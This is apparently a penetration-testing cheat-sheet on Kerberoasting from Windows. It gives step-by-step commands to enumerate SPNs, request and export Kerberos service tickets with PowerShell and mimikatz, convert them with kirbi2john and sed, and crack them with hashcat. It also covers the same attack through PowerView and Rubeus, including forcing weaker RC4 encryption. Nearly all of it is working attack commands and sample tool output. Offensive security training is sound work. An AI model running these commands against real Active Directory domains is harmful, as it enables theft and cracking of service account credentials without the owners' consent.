# Kerberoasting - From Windows

### Semi Manual Method

* `C:\> setspn.exe -Q */*` → lists various available SPNs
* `PS C:\> Add-Type -AssemblyName System.IdentityModel`
* `PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL:1433"`
  * The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
  * The `AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
  * [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
  * We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
  * We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

We are requesting TGS tickets for an account and load them into memory to later extract using Mimikatz

* `PS C:\> setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` → request tickets for all accounts with SPNs set.

Now lets extract tickets from mimikatz

```
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL:1433 @ DOMAIN.LOCAL
   Client Name       : USERNAME @ DOMAIN.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
====================
Base64 of file : 2-40a10000-USERNAME@MSSQLSvc~DEV-PRE-SQL~1433-DOMAIN.LOCAL.kirbi
====================
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE
<...................SNIP...................>
LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu
ZWZyZWlnaHQubG9jYWw6MTQzMw==
====================

   * Saved to file     : 2-40a10000-USERNAME@MSSQLSvc~DEV-PRE-SQL~1433-DOMAIN.LOCAL.kirbi

<SNIP>
```

if we do not specify `base64 /out:true` , mimikatz will extract the tickets and write them to `.kirbi` files

* decode this base64 Blob and save into file `sqldev.kirbi`
* then use `kirbi2john` to extract Kerberos Ticket.
*   `sed 's/\$krb5tgs\$(.*):\(.*\)/\$krb5tgs\$23\$\1\$\2/' crack_file > sqldev_tgs_hashcat` → modify the file/hash for Hashcat

    \*\*$\*\*krb5tgs$23$_sqldev.kirbi_$813149fb261549a6a1b38e71a057feeab → it will look something like this
* `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt` → finally cracking the hash.

### Automated / Tool Based Route

* `setspn.exe -Q */*` → list available spns

#### Using PowerView

* `PS C:\> Import-Module .\PowerView.ps1` → importing powerview
* `PS C:\> Get-DomainUser * -spn | select samaccountname` → getting spn account
* `PS C:\> Get-DomainUser -Identity username | Get-DomainSPNTicket -Format Hashcat` → Targeting Specific User
* `PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` → Exporting All tickets to csv file

#### Using Rubeus

Rubeus does not need us to explicitly set the SPN or the user.

* `PS C:\> .\Rubeus.exe kerberoast /stats` → get the stats
*   `PS C:\> .\Rubeus.exe kerberoast`

    we can add flag `/nowrap` so that hash will not be wrapped in any form so it will be easier to crack using hashcat.

    also we can use `/outfile:filename` to save the ticket, instead of displaying it.
* `PS C:\> .\Rubeus.exe kerberoast /user:testspn /nowrap` → for specific user.

we can use `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.

RC4 is easier to crack compared to AES 256 and 128
